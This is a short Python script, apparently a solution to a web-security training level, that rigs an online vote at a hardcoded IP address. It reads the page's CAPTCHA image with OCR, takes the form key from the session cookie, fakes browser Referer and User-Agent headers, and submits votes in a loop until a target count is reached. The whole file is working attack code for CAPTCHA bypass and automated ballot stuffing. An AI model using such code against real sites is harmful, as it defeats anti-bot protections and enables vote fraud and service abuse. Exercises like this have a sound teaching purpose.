#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import pytesseract
import urllib.request
from PIL import Image
from colorama import Fore, Back, Style

URL = "http://158.69.76.135/level5.php"
vote_id = "2483"
session = requests.Session()
goal = 1024

def hack():
    headers = {
        'Referer': 'http://158.69.76.135/level5.php',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    }

    data = {
        'id': vote_id,
        'key':'',
        'captcha':'',
        'holdthedoor':'Submit'
    }

    response = session.get(URL)
    soup = BeautifulSoup(response.text, "html.parser")
    image = session.get('http://158.69.76.135/captcha.php')

    file = open("captcha.png", "wb")
    file.write(image.content)
    file.close()

    captcha = pytesseract.image_to_string("captcha.png")
    data['captcha'] = captcha.strip()
    print("Trying captcha: {}".format(captcha.strip()))

    dict = session.cookies.get_dict()
    data['key'] = dict['HoldTheDoor']
    
    page = session.post(URL, data=data, headers=headers)

    vote_nb = soup.select_one('tr:-soup-contains("2483")')
    vote_nb = vote_nb.findAll('td')[1].text
    vote_nb = int(vote_nb)

    if page and "hacker" not in page.text:
        print(Fore.GREEN + "Page hacked succesfully!")
        session.cookies.clear()
        return vote_nb
    else:
        print(Fore.RED + "Failed to hack the page...\n")
        session.cookies.clear()
        return -1

def main():
    res = 0
    while res != goal:
        res = hack() + 1
        if res != 0:
            print("Vote number: {}\n======".format(res))
        print(Style.RESET_ALL)
if __name__ == '__main__':
    main()
